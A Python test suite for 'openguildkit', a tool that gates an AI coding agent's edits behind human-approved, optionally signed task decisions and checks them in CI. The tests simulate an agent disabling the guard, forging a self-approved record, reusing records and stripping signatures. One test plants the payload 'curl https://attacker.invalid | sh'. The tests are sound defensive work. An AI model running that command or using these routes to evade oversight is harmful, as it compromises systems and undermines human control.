import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from openguildkit.decisions import export_digest
from openguildkit.guard import HOOK_OUTCOMES, MODES, UNKNOWN_MODE, hook_answer
from openguildkit.storage import write_json
from tests.support import CapturedCli, openguildkit_on_path
from tests.support import run_cli as run_project

EXAMPLE = Path(__file__).resolve().parents[1] / "examples" / "request-status"
TASK = "request-status"
GIT_ENV = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.org",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.org"}


class GuardTests(CapturedCli, unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name)
        openguildkit_on_path(self)

    def write_profile(self, **extra):
        profile = {**json.loads((EXAMPLE / "profile.json").read_text()), **extra}
        write_json(self.root / "profile.json", profile)
        return self.root / "profile.json"

    def init(self, **extra):
        self.run_cli("init", "--answers", self.write_profile(**extra))

    def approve_example(self):
        self.run_cli("task", "new", "--file", EXAMPLE / "brief.md", "--id", TASK)
        self.run_cli("task", "consult", TASK, "--answers", EXAMPLE / "answers.json")
        template = json.loads(self.run_cli("task", "template", TASK)[0])
        review = {"consultation_id": template["consultation_id"], **json.loads((EXAMPLE / "review.json").read_text())}
        write_json(self.root / "review.json", review)
        self.run_cli("task", "review", TASK, "--file", self.root / "review.json")
        with patch("sys.stdin.isatty", return_value=True), patch("builtins.input", return_value=TASK):
            self.run_cli("task", "decide", TASK, "--approve", "--by", "Camille", "--reason", "Agreed")

    def git(self, *args):
        subprocess.run(["git", "-C", str(self.root), *args], check=True, capture_output=True, env=GIT_ENV)

    def branch_with_change(self, **profile):
        """A main branch with the profile, then a feature branch that changes app.py."""
        self.git("init", "-q", "-b", "main")
        self.init(**profile)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "feature")
        (self.root / "app.py").write_text("print('status')\n", encoding="utf-8")
        self.git("add", "app.py")
        self.git("commit", "-q", "-m", "change")

    def commit_record(self, name, record):
        path = self.root / ".openguildkit" / "decisions" / name
        write_json(path, record)
        self.git("add", "-f", path)
        self.git("commit", "-q", "-m", f"record {name}")

    def ci(self, code=0):
        output, error = self.run_cli("guard", "--ci", "--base", "main", "--json", code=code)
        return json.loads(output)

    def edit_input(self, path):
        return json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(path)}})

    def test_the_guard_stays_silent_when_off(self):
        self.init()
        self.assertEqual(self.run_cli("guard", "--hook", "prompt", stdin=""), ("", ""))
        self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"))

    def test_each_request_reminds_the_agent_and_edits_are_refused_in_enforce_mode(self):
        self.init(guard="enforce")
        context = json.loads(self.run_cli("guard", "--hook", "prompt", stdin="")[0])
        self.assertIn("no approved task", context["hookSpecificOutput"]["additionalContext"])
        _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"), code=2)
        self.assertIn("Edit refused for", error)
        self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / ".openguildkit" / "answers.json"))
        self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(Path(tempfile.gettempdir()) / "answers.json"))
        patch_input = json.dumps({"tool_name": "apply_patch", "tool_input": {"command": "*** Begin Patch\n*** Update File: app.py\n"}})
        self.run_cli("guard", "--hook", "pre-edit", stdin=patch_input, code=2)

        self.approve_example()
        self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"))
        self.assertIn(TASK, json.loads(self.run_cli("guard", "--json")[0])["covered_by"][0])

    def test_observe_mode_flags_without_blocking(self):
        self.init(guard="observe")
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"))
        context = json.loads(output)["hookSpecificOutput"]["additionalContext"]
        self.assertIn("flagged, not blocked", context)
        self.assertIn("app.py", context)
        self.assertNotIn("refused", context)
        # What happened comes first, then what the project expects.
        self.assertTrue(context.startswith("OpenGuildKit: Edit flagged, not blocked (guard: observe): app.py."), context)
        self.assertLess(context.index("flagged"), context.index("wait for the person's approval"))

    def test_the_answer_and_the_exit_code_say_the_same_thing_in_every_mode(self):
        for mode in MODES:
            for event in ("prompt", "pre-edit"):
                for outcome in HOOK_OUTCOMES:
                    with self.subTest(mode=mode, event=event, outcome=outcome):
                        code, output, error = hook_answer(event, mode, outcome, "app.py")
                        text = json.loads(output)["hookSpecificOutput"]["additionalContext"] if output else error
                        if mode == "off" or outcome == "outside":
                            self.assertEqual((code, output, error), (0, "", ""))
                            continue
                        blocks = event == "pre-edit" and mode == "enforce" and outcome != "covered"
                        self.assertEqual(code, 2 if blocks else 0)
                        self.assertEqual(bool(error), blocks)
                        if mode == "observe":
                            self.assertNotIn("refused", text)
                        if event == "pre-edit" and outcome != "covered":
                            self.assertIn("Edit refused" if blocks else "flagged, not blocked", text)

    def test_an_unreadable_mode_refuses_and_says_why(self):
        code, output, error = hook_answer("pre-edit", UNKNOWN_MODE, "unchecked", "the profile is not JSON")
        self.assertEqual((code, output), (2, ""))
        self.assertIn("Edit refused", error)
        self.assertIn("cannot know its mode", error)

    def test_every_mode_answers_a_real_edit_in_words_that_match_its_exit_code(self):
        self.init()
        project = self.root / ".openguildkit" / "project.json"
        inputs = {"uncovered": self.edit_input(self.root / "app.py"),
                  "protected": self.edit_input(project), "unchecked": "not json"}
        for mode in MODES:
            profile = json.loads(project.read_text(encoding="utf-8"))
            write_json(project, {**profile, "guard": mode})
            for outcome, stdin in inputs.items():
                with self.subTest(mode=mode, outcome=outcome):
                    code = 2 if mode == "enforce" else 0
                    output, error = self.run_cli("guard", "--hook", "pre-edit", stdin=stdin, code=code)
                    text = json.loads(output)["hookSpecificOutput"]["additionalContext"] if output else error
                    self.assertEqual("refused" in text, mode == "enforce", text)
                    self.assertEqual("not blocked" in text, mode == "observe", text)

    def test_a_covered_edit_says_the_guard_does_not_compare_files_with_the_scope(self):
        self.init(guard="observe")
        self.approve_example()
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "README.md"))
        context = json.loads(output)["hookSpecificOutput"]["additionalContext"]
        self.assertIn(TASK, context)
        self.assertIn("does not compare", context)
        self.assertNotIn("falls under", context)
        self.assertIn("does not compare", self.run_cli("guard")[0])

    def test_the_unsigned_approval_warning_shows_at_init_check_and_host_check_only(self):
        _, error = self.run_cli("init", "--answers", self.write_profile(guard="enforce", host="claude-code"))
        self.assertIn("not signed", error)
        self.assertNotIn("not signed", self.run_cli("host", "apply")[1])
        with patch("openguildkit.hosts.shutil.which", return_value="/opt/tools/openguildkit"):
            self.assertIn("not signed", self.run_cli("host", "check")[1])
        with patch("openguildkit.hosts.shutil.which", return_value="/opt/tools/openguildkit"):
            self.assertIn("not signed", self.run_cli("check")[1])
        with patch("openguildkit.hosts.shutil.which", return_value=None):
            self.assertIn("not signed", self.run_cli("check", code=1)[1])
        for command in (("task", "list"), ("guard",), ("sync",)):
            self.assertNotIn("not signed", self.run_cli(*command)[1], command)

    def test_host_apply_installs_the_hooks(self):
        self.init(guard="enforce", host="claude-code")
        self.run_cli("host", "apply")
        hooks = json.loads((self.root / ".claude" / "settings.json").read_text())["hooks"]
        self.assertEqual(hooks["PreToolUse"][0]["hooks"][0]["command"], "openguildkit guard --hook pre-edit")
        self.assertEqual(hooks["UserPromptSubmit"][0]["hooks"][0]["command"], "openguildkit guard --hook prompt")
        self.run_cli("host", "apply")
        self.assertEqual(len(json.loads((self.root / ".claude" / "settings.json").read_text())["hooks"]["PreToolUse"]), 1)
        with patch("openguildkit.hosts.shutil.which", return_value="/opt/tools/openguildkit"):
            report = {item["id"]: item["status"] for item in json.loads(self.run_cli("host", "check", "--json")[0])}
        self.assertEqual(report["board"], "enforced")

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_in_observe_says_an_uncovered_change_is_flagged_not_blocking(self):
        self.branch_with_change(guard="observe")
        text, _ = self.run_cli("guard", "--ci", "--base", "main")
        self.assertIn("no exported decision", text)
        self.assertIn("Flagged, not blocking", text)
        self.git("checkout", "-q", "main")
        profile = self.root / ".openguildkit" / "project.json"
        profile.write_text(profile.read_text(encoding="utf-8").replace('"observe"', '"enforce"'), encoding="utf-8")
        self.git("commit", "-q", "-am", "enforce")
        self.git("checkout", "-q", "feature")
        self.git("rebase", "-q", "main")
        text, _ = self.run_cli("guard", "--ci", "--base", "main", code=1)
        self.assertNotIn("not blocking", text)

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_requires_an_exported_decision_for_changes(self):
        def git(*args):
            subprocess.run(["git", "-C", str(self.root), *args], check=True, capture_output=True, env=GIT_ENV)
        git("init", "-q", "-b", "main")
        self.init(guard="enforce")
        git("add", "-A")
        git("commit", "-q", "-m", "base")
        git("checkout", "-q", "-b", "feature")
        self.approve_example()
        (self.root / "app.py").write_text("print('status')\n", encoding="utf-8")
        git("add", "app.py")
        git("commit", "-q", "-m", "change")
        result = json.loads(self.run_cli("guard", "--ci", "--base", "main", "--json", code=1)[0])
        self.assertIn("no exported decision", result["problems"][0])

        exported = self.run_cli("task", "export", TASK)[0].strip()
        record = json.loads((self.root / exported).read_text())
        self.assertNotIn("\"evidence\":", json.dumps(record))
        self.assertEqual(record["files"], ["app.py"])
        git("add", exported)
        git("commit", "-q", "-m", "decision")
        result = json.loads(self.run_cli("guard", "--ci", "--base", "main", "--json")[0])
        self.assertEqual(result["decisions"], [TASK])
        self.assertTrue(result["ok"])

    def test_enforce_refuses_edits_to_the_files_the_guard_relies_on(self):
        self.init(guard="enforce")
        self.approve_example()
        for relative in (f".openguildkit/tasks/{TASK}.json", ".openguildkit/project.json", ".openguildkit/decisions/x.json",
                         ".openguildkit/catalog.lock.json", ".claude/settings.json", ".claude/settings.local.json"):
            _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / relative), code=2)
            self.assertIn("written by the openguildkit commands", error)
        patch_input = json.dumps({"tool_name": "apply_patch", "tool_input": {
            "command": "*** Begin Patch\n*** Update File: .openguildkit/project.json\n@@\n-  \"guard\": \"enforce\"\n+  \"guard\": \"off\"\n"}})
        self.run_cli("guard", "--hook", "pre-edit", stdin=patch_input, code=2)

    def test_enforce_refuses_the_signers_the_alert_register_and_the_project_catalog_without_an_approved_task(self):
        (self.root / "keys").mkdir()
        (self.root / "keys" / "allowed_signers").write_text("pat@example.org ssh-ed25519 AAAA\n", encoding="utf-8")
        self.init(guard="enforce", approval={"mode": "signed", "allowed_signers": "keys/allowed_signers",
                                             "approvers": ["pat@example.org"]})
        paths = ("keys/allowed_signers", ".openguildkit/alerts.json", ".openguildkit/catalog/boards/security.json",
                 ".openguildkit/catalog/tools/issue-tracking.json")
        for relative in paths:
            with self.subTest(path=relative):
                _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(relative), code=2)
                self.assertIn(f"Edit refused for: {relative}" if "catalog" in relative or "alerts" in relative
                              else f"{relative} lists the keys that may sign approvals", error)
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(".openguildkit/answers.json"))
        self.assertEqual(output, "")

    def test_init_says_how_to_require_signed_approvals_until_the_project_does(self):
        hint = "To require signed ones: openguildkit profile set approval signed"
        for guard, approval, shown in (("observe", None, True), ("enforce", None, True), ("off", None, False),
                                       ("enforce", {"mode": "signed", "allowed_signers": "allowed_signers",
                                                    "approvers": ["pat@example.org"]}, False)):
            with self.subTest(guard=guard, signed=bool(approval)):
                shutil.rmtree(self.root / ".openguildkit", ignore_errors=True)
                (self.root / "allowed_signers").write_text("pat@example.org ssh-ed25519 AAAA\n", encoding="utf-8")
                extra = {"guard": guard, **({"approval": approval} if approval else {})}
                output, _ = self.run_cli("init", "--answers", self.write_profile(**extra))
                self.assertEqual(hint in output, shown)

    def test_an_approved_task_covers_the_catalog_and_the_alert_register_never_the_signers(self):
        (self.root / "allowed_signers").write_text("pat@example.org ssh-ed25519 AAAA\n", encoding="utf-8")
        self.init(guard="enforce", approval={"mode": "signed", "allowed_signers": "allowed_signers",
                                             "approvers": ["pat@example.org"]})
        approval = {"task": "t1", "brief": "Add a board", "approved_at": "2026-11-22T09:00:00+00:00", "stale": False}
        with patch("openguildkit.guard.covering_approvals", return_value=[approval]):
            for relative in (".openguildkit/alerts.json", ".openguildkit/catalog/boards/security.json"):
                self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(relative))
            _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "ALLOWED_SIGNERS"),
                                    code=2)
        self.assertIn("only the person changes it", error)
        profile = self.root / ".openguildkit" / "project.json"
        write_json(profile, {**json.loads(profile.read_text(encoding="utf-8")), "guard": "observe"})
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input("allowed_signers"))
        self.assertIn("Edit flagged, not blocked", json.loads(output)["hookSpecificOutput"]["additionalContext"])

    def test_observe_reports_an_edit_to_the_guard_files_and_lets_it_through(self):
        self.init(guard="observe")
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / ".openguildkit" / "project.json"))
        self.assertIn("written by the openguildkit commands", json.loads(output)["hookSpecificOutput"]["additionalContext"])

    def test_a_patch_that_moves_a_file_into_the_project_is_checked(self):
        self.init(guard="enforce")
        moved = json.dumps({"tool_name": "apply_patch", "tool_input": {
            "command": "*** Begin Patch\n*** Update File: .openguildkit/notes.json\n*** Move to: app.py\n@@\n-a\n+b\n"}})
        _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=moved, code=2)
        self.assertIn("app.py", error)

    def test_enforce_refuses_an_edit_the_guard_cannot_check(self):
        self.init(guard="enforce")
        tasks = self.root / ".openguildkit" / "tasks"
        tasks.mkdir(exist_ok=True)
        write_json(tasks / "broken.json", {"schema_version": 1, "id": "broken", "status": "approved", "decision": {"seal": "x"}})
        _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"), code=2)
        self.assertIn("Edit refused for", error)
        unreadable = ("not json", json.dumps({"tool_input": {"file_path": ["app.py"]}}), json.dumps({"tool_input": {}}), "")
        for stdin in unreadable:
            _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=stdin, code=2)
            self.assertIn("could not check this edit", error)
            self.assertEqual(len(error.strip().splitlines()), 1)
        with patch("openguildkit.guard.covering_approvals", side_effect=RuntimeError("disk gone")):
            _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"), code=2)
        self.assertIn("RuntimeError: disk gone", error)
        (self.root / ".openguildkit" / "project.json").write_text("{", encoding="utf-8")
        _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"), code=2)
        self.assertIn("could not check this edit", error)
        self.assertIn("cannot know its mode", error)
        output, _ = self.run_cli("guard", "--hook", "prompt", stdin="")
        self.assertIn("could not run", json.loads(output)["hookSpecificOutput"]["additionalContext"])
        self.assertIn("cannot know its mode", json.loads(output)["hookSpecificOutput"]["additionalContext"])

    def test_observe_reports_an_edit_the_guard_cannot_check_and_lets_it_through(self):
        self.init(guard="observe")
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin="not json")
        self.assertIn("could not check this edit", json.loads(output)["hookSpecificOutput"]["additionalContext"])

    def test_the_agent_is_told_which_task_covers_the_edit_and_old_approvals_are_flagged(self):
        self.init(guard="enforce")
        self.approve_example()
        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"))
        context = json.loads(output)["hookSpecificOutput"]["additionalContext"]
        self.assertIn(TASK, context)
        self.assertIn("Show signed-in users the status", context)
        self.assertFalse(json.loads(self.run_cli("guard", "--json")[0])["approvals"][0]["stale"])
        with patch("openguildkit.guard._age_days", return_value=30):
            approvals = json.loads(self.run_cli("guard", "--json")[0])["approvals"]
            prompt = json.loads(self.run_cli("guard", "--hook", "prompt", stdin="")[0])
        self.assertTrue(approvals[0]["stale"])
        self.assertIn("more than 14 days ago", prompt["hookSpecificOutput"]["additionalContext"])

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_refuses_a_decision_record_it_cannot_recompute(self):
        self.branch_with_change(guard="enforce")
        self.approve_example()
        fingerprint = json.loads(self.run_cli("task", "show", TASK, "--json")[0])["profile_fingerprint"]
        self.commit_record("fake.json", {"task": "nothing", "profile_fingerprint": fingerprint,
                                         "decision": {"seal": "x", "by": "Agent", "reason": "Self-approved"}})
        result = self.ci(code=1)
        self.assertEqual(result["decisions"], [])
        self.assertIn("no approval payload", result["problems"][0])

        exported = json.loads((self.root / self.run_cli("task", "export", TASK)[0].strip()).read_text())
        exported["task"] = "nothing"
        exported["decision"]["payload"]["task"] = "nothing"
        self.commit_record("fake.json", exported)
        self.assertIn("seal does not match", self.ci(code=1)["problems"][0])

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_reports_a_malformed_record_without_a_traceback(self):
        self.branch_with_change(guard="enforce")
        self.commit_record("fake.json", {"task": "nothing", "profile_fingerprint": "f", "decision": "oops"})
        output, error = self.run_cli("guard", "--ci", "--base", "main", code=1)
        self.assertIn("  .openguildkit/decisions/fake.json is not a decision record", output)
        self.assertEqual(error, "")

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_outside_a_git_repository_says_so_in_one_line(self):
        self.init(guard="enforce")
        with patch.dict(os.environ, {"GIT_CEILING_DIRECTORIES": str(self.root.parent)}):
            output, error = self.run_cli("guard", "--ci", "--base", "main", code=1)
        self.assertEqual(output, "")
        self.assertEqual(len(error.splitlines()), 1, error)
        self.assertTrue(error.startswith("OpenGuildKit: guard --ci needs a Git repository"), error)

    def test_ci_without_git_says_git_is_missing_in_one_sentence(self):
        """Issue #459: guard --ci without Git printed the system's raw error, [Errno 2] No such file or directory."""
        self.init(guard="enforce")
        with patch.dict(os.environ, {"PATH": str(self.root)}):
            output, error = self.run_cli("guard", "--ci", "--base", "main", code=1)
        self.assertEqual(output, "")
        self.assertEqual(error, "OpenGuildKit: guard --ci needs Git: it is not installed or not on the PATH.\n")

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_reads_accented_names_and_records_exported_before_they_were(self):
        """Issue #458: task export wrote docs/résumé.md as "docs/r\\303\\251sum\\303\\251.md"; a record exported so
        before the fix still covers the file."""
        self.git("init", "-q", "-b", "main")
        self.init(guard="enforce")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "feature")
        self.approve_example()
        for name in ("docs/résumé.md", "docs/a b.md"):
            (self.root / "docs").mkdir(exist_ok=True)
            (self.root / name).write_text("x\n", encoding="utf-8")
        self.git("add", "docs")
        self.git("commit", "-q", "-m", "change")
        exported = self.run_cli("task", "export", TASK)[0].strip()
        record = json.loads((self.root / exported).read_text(encoding="utf-8"))
        self.assertEqual(record["files"], ["docs/a b.md", "docs/résumé.md"])
        record = {key: value for key, value in record.items() if key != "record_sha256"}
        record["files"] = ["docs/a b.md", '"docs/r\\303\\251sum\\303\\251.md"']
        record["record_sha256"] = export_digest(record)
        self.commit_record(f"{TASK}.json", record)
        result = self.ci()
        self.assertEqual(result["decisions"], [TASK])
        self.assertTrue(result["ok"], result["problems"])

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_the_first_pull_request_explains_why_nothing_is_enforced_and_what_comes_next(self):
        self.git("init", "-q", "-b", "main")
        (self.root / "README.md").write_text("Portal\n", encoding="utf-8")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "before the profile")
        self.git("checkout", "-q", "-b", "feature")
        self.init(guard="observe")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "add the profile")
        result = self.ci()
        self.assertEqual(result["mode"], "off")
        note = result["problems"][0]
        self.assertIn("expected", note)
        self.assertIn('"guard": "observe"', note)
        text, _ = self.run_cli("guard", "--ci", "--base", "main")
        self.assertIn("once the profile is merged", text)

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_reads_the_rules_from_the_base_revision(self):
        self.branch_with_change(guard="enforce")
        profile = self.root / ".openguildkit" / "project.json"
        profile.write_text(profile.read_text(encoding="utf-8").replace('"enforce"', '"observe"'), encoding="utf-8")
        self.git("commit", "-q", "-am", "weaken the guard")
        result = self.ci(code=1)
        self.assertEqual(result["mode"], "enforce")
        self.assertEqual(result["changed"], 2)

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_uses_the_same_earlier_rules_diagnostic(self):
        self.branch_with_change(guard="enforce")
        profile_path = self.root / ".openguildkit" / "project.json"
        profile = json.loads(profile_path.read_text(encoding="utf-8"))
        profile["checks"] = ["python -m pytest"]
        write_json(profile_path, profile)
        self.run_cli("sync")
        self.approve_example()
        exported, _ = self.run_cli("task", "export", TASK)
        path = self.root / exported.strip()
        self.git("add", str(path.relative_to(self.root)))
        self.git("commit", "-q", "-m", "Export a decision under the branch rules")
        report = self.ci(code=1)
        self.assertIn(f"The approval for {TASK} was recorded under earlier rules.", report["problems"][0])
        self.assertIn(f"--follows {TASK}", report["problems"][0])

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_a_profile_change_alone_needs_a_decision(self):
        self.git("init", "-q", "-b", "main")
        self.init(guard="enforce")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "feature")
        profile = self.root / ".openguildkit" / "project.json"
        profile.write_text(profile.read_text(encoding="utf-8").replace('"enforce"', '"off"'), encoding="utf-8")
        self.git("commit", "-q", "-am", "turn the guard off")
        result = self.ci(code=1)
        self.assertEqual(result["changed"], 1)
        self.assertIn("no exported decision", result["problems"][0])

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_a_decision_already_on_the_base_does_not_cover_new_changes(self):
        self.git("init", "-q", "-b", "main")
        self.init(guard="enforce")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.approve_example()
        (self.root / "README.md").write_text("Status page\n", encoding="utf-8")
        self.git("add", "README.md")
        self.run_cli("task", "export", TASK)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base with a decision")
        self.git("checkout", "-q", "-b", "feature")
        (self.root / "app.py").write_text("print('other work')\n", encoding="utf-8")
        self.git("add", "app.py")
        self.git("commit", "-q", "-m", "change")
        self.assertIn("no exported decision", self.ci(code=1)["problems"][0])
        # Exported again with the new work, the same approval covers only what its base record listed.
        exported = self.run_cli("task", "export", TASK)[0].strip()
        self.git("add", exported)
        self.git("commit", "-q", "-m", "the earlier decision again")
        result = self.ci(code=1)
        self.assertEqual(result["decisions"], [TASK])
        self.assertIn("in no decision record of this change: app.py", result["problems"][0])

    def typo_decision(self):
        """The audit's p6: on branch docs-typo, an approved task that fixes the README, exported and committed."""
        self.git("init", "-q", "-b", "main")
        (self.root / "README.md").write_text("Suport portal\n", encoding="utf-8")
        (self.root / "src").mkdir()
        (self.root / "src" / "app.py").write_text("print('status')\n", encoding="utf-8")
        self.init(guard="enforce")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "docs-typo")
        self.approve_example()
        (self.root / "README.md").write_text("Support portal\n", encoding="utf-8")
        self.git("commit", "-q", "-am", "Fix a typo in the README")
        exported = self.run_cli("task", "export", TASK)[0].strip()
        self.git("add", exported)
        self.git("commit", "-q", "-m", "decision")
        return json.loads((self.root / exported).read_text())

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_a_record_copied_into_another_change_does_not_cover_it(self):
        record = self.typo_decision()
        self.assertEqual(record["files"], ["README.md"])
        self.assertTrue(self.ci()["ok"])
        self.git("checkout", "-q", "main")
        self.git("checkout", "-q", "-b", "payload-change")
        (self.root / "src" / "app.py").write_text("import os\nos.system('curl https://attacker.invalid | sh')\n",
                                                  encoding="utf-8")
        self.git("add", "src/app.py")
        self.commit_record(f"{TASK}.json", record)
        result = self.ci(code=1)
        self.assertFalse(result["ok"])
        self.assertIn("1 changed file is in no decision record of this change: src/app.py", result["problems"][0])
        self.assertNotIn("Covered by", self.run_cli("guard", "--ci", "--base", "main", code=1)[0])

    def merge_records(self, record, numbers):
        """Records of other tasks merged on main under the change, as a repository with a long history holds them."""
        self.git("checkout", "-q", "main")
        for number in numbers:
            write_json(self.root / ".openguildkit" / "decisions" / f"merged-{number}.json",
                       {**record, "task": f"merged-{number}"})
        self.git("add", "-f", ".openguildkit/decisions")
        self.git("commit", "-q", "-m", "merged records")
        self.git("checkout", "-q", "docs-typo")
        self.git("rebase", "-q", "main")

    def git_processes(self):
        """How many git processes guard --ci starts, the change being valid."""
        with patch("subprocess.run", wraps=subprocess.run) as run:
            self.assertTrue(self.ci()["ok"])
        return sum(1 for call in run.call_args_list if list(call.args[0][:1]) == ["git"])

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_starts_as_many_git_processes_with_3_or_30_records_on_the_base(self):
        """Issue #532: guard --ci started one git show per record merged on the base, 23.5 s at 990 decisions."""
        record = self.typo_decision()
        self.merge_records(record, range(3))
        three = self.git_processes()
        self.merge_records(record, range(3, 30))
        self.assertEqual(self.git_processes(), three)

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_says_local_approvals_cannot_be_verified_and_fails_on_request(self):
        self.typo_decision()
        result = self.ci()
        self.assertTrue(result["ok"])
        self.assertIn("Approvals on the base revision are local", result["notes"][0])
        self.assertIn("nothing here proves who approved", self.run_cli("guard", "--ci", "--base", "main")[0])
        output, _ = self.run_cli("guard", "--ci", "--base", "main", "--require-signed", code=1)
        self.assertIn("--require-signed fails this check until they are", output)
        self.assertNotIn("Covered by", output)

    @unittest.skipIf(shutil.which("git") is None, "needs git")
    def test_ci_names_a_change_to_the_workflow_that_runs_it(self):
        workflow = self.root / ".github" / "workflows" / "openguildkit-guard.yml"
        workflow.parent.mkdir(parents=True)
        workflow.write_text("jobs:\n  guard:\n    steps:\n      - run: openguildkit guard --ci --base \"$BASE_REF\"\n",
                            encoding="utf-8")
        other = workflow.with_name("tests.yml")
        other.write_text("jobs: {}\n", encoding="utf-8")
        self.git("init", "-q", "-b", "main")
        self.init(guard="enforce")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "feature")
        self.approve_example()
        workflow.write_text("jobs:\n  guard:\n    steps:\n      - run: echo skipped\n", encoding="utf-8")
        other.write_text("jobs: {lint: {}}\n", encoding="utf-8")
        self.git("commit", "-q", "-am", "edit the workflows")
        self.git("add", self.run_cli("task", "export", TASK)[0].strip())
        self.git("commit", "-q", "-m", "decision")
        result = self.ci()
        self.assertTrue(result["ok"])
        self.assertIn("This change edits .github/workflows/openguildkit-guard.yml, which runs this check", result["notes"][0])
        self.assertNotIn("tests.yml", result["notes"][0])
        self.assertIn("CODEOWNERS", self.run_cli("guard", "--ci", "--base", "main")[0])
        with patch.dict(os.environ, {"GITHUB_WORKFLOW_REF": "acme/portal/.github/workflows/tests.yml@refs/pull/7/merge"}):
            self.assertIn("openguildkit-guard.yml, .github/workflows/tests.yml", self.ci()["notes"][0])

    @unittest.skipIf(shutil.which("git") is None or shutil.which("ssh-keygen") is None, "needs git and ssh-keygen")
    def test_ci_verifies_signed_decisions_against_the_base_signers(self):
        keys = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, keys, ignore_errors=True)
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(keys / "camille")], check=True)
        public = (keys / "camille.pub").read_text().strip()
        (self.root / "allowed_signers").write_text(f"camille@example.org {public}\n", encoding="utf-8")
        self.branch_with_change(guard="enforce", approval={
            "mode": "signed", "allowed_signers": "allowed_signers", "approvers": ["camille@example.org"]})
        self.run_cli("task", "new", "--file", EXAMPLE / "brief.md", "--id", TASK)
        self.run_cli("task", "consult", TASK, "--answers", EXAMPLE / "answers.json")
        template = json.loads(self.run_cli("task", "template", TASK)[0])
        review = {"consultation_id": template["consultation_id"], **json.loads((EXAMPLE / "review.json").read_text())}
        write_json(self.root / "review.json", review)
        self.run_cli("task", "review", TASK, "--file", self.root / "review.json")
        self.run_cli("task", "decision-payload", TASK, "--by", "Camille", "--reason", "Agreed", "--output", keys / "decision.json")
        subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", str(keys / "camille"), "-n", "openguildkit-decision",
                        str(keys / "decision.json")], check=True, capture_output=True)
        self.run_cli("task", "decide", TASK, "--approve", "--by", "Camille", "--reason", "Agreed",
                     "--signer", "camille@example.org", "--signature", keys / "decision.json.sig")
        (self.root / "app.py").write_text("print('status page')\n", encoding="utf-8")
        self.git("commit", "-q", "-am", "the approved work")
        record = json.loads((self.root / self.run_cli("task", "export", TASK)[0].strip()).read_text())
        self.commit_record(f"{TASK}.json", record)
        self.assertEqual(self.ci()["decisions"], [TASK])
        text, _ = self.run_cli("guard", "--ci", "--base", "main")
        self.assertIn(f"Covered by the decision of task {TASK}", text)

        (self.root / "allowed_signers").write_text("camille@example.org ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK\n", encoding="utf-8")
        self.git("commit", "-q", "-am", "swap the signers")
        swapped = self.ci(code=1)
        self.assertEqual(swapped["decisions"], [TASK])
        self.assertIn("in no decision record of this change: allowed_signers", swapped["problems"][0])
        unsigned = {**record, "decision": {key: value for key, value in record["decision"].items() if key != "signature"}}
        # Whoever removes the signature can recompute the record's own digest; the signature check still refuses it.
        unsigned["record_sha256"] = export_digest(unsigned)
        self.commit_record(f"{TASK}.json", unsigned)
